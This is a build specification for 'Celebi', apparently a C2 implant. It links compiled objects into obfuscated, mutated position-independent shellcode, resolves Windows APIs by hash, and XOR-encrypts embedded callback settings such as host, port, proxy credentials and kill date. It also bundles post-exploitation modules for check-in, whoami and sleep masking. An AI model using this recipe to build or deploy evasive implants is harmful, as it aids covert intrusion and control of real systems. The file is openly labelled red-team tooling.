name "Celebi PIC Linker"
author "Callum Murphy-Hale (@ofasgard)"
reference "https://github.com/ofasgard/celebi"
license "GPL-2.0"

x64:
	# Load the COFF.
	load "bin/main.o"
	make coff
	
	# Merge in other objects.
	load "bin/vault.o"
	merge
	
	load "bin/message.o"
	merge
	
	load "bin/params.o"
	merge

	load "bin/pico.o"
	merge
	
	load "bin/util.o"
	merge
	
	load "bin/crypto.o"
	merge
	
	load "bin/ecke.o"
	merge
	
	load "bin/p2p.o"
	merge
	
	export
	
	# Make the shellcode.
	make pic +optimize +gofirst +disco +mutate +regdance +blockparty
	
	# Merge in LibTCG.
	mergelib "lib/libtcg/libtcg.x64.zip"
	
	# Merge in LibWinHttp.
	mergelib "lib/LibWinHttp/libwinhttp.x64.zip"
	
	# Opt into dynamic function resolution using the resolve() function.
	dfr "resolve" "ror13" "KERNEL32, NTDLL, WS2_32, BCRYPT"
	dfr "resolve_unloaded" "strings"
	
	# Generate a random XOR key and patch it in.
	generate $ENC_KEY 128
	patch "ENC_KEY" $ENC_KEY
	
	# Seed the runtime RNG state with a fresh per-build value.
	generate $RNG_SEED 4
	patch "crypto_rng_state" $RNG_SEED
	
	# Marshal and obfuscate string parameters from the C2.
	pack $RAW_PARAMS "zziizzziizzzizzzzzzzi" %PAYLOAD_UUID %CALLBACK_HOST %CALLBACK_PORT %CALLBACK_HTTPS %POST_URI %GET_URI %QUERY_PATH_NAME %CALLBACK_INTERVAL %CALLBACK_JITTER %KILLDATE %HEADERS %PROXY_HOST %PROXY_PORT %PROXY_USER %PROXY_PASS %AES_VALUE %AES_KEY %ENCRYPTED_EXCHANGE_CHECK %PIPENAME %P2P_PROFILE %P2P_PORT
	
	push $RAW_PARAMS
	xor $ENC_KEY
	pop $ENC_PARAMS
	
	# Patch in obfuscated string parameters from the C2.
	patch "ENC_PARAMS" $ENC_PARAMS
	
	# Load and obfuscate built-in PICOs.
	load "bin/pico_checkin.o"
		make object +optimize
		export
		xor $ENC_KEY
		preplen
		link "pico_checkin"
		
	load "bin/pico_whoami.o"
		make object +optimize
		export
		xor $ENC_KEY
		preplen
		link "pico_whoami"
		
	load "bin/pico_mask_vault.o"
		make object +optimize
		export
		xor $ENC_KEY
		preplen
		link "pico_mask_vault"
		
	load "bin/pico_mask_sleep.o"
		make object +optimize
		export
		xor $ENC_KEY
		preplen
		link "pico_mask_sleep"

 	# Export the resulting PIC.
	export
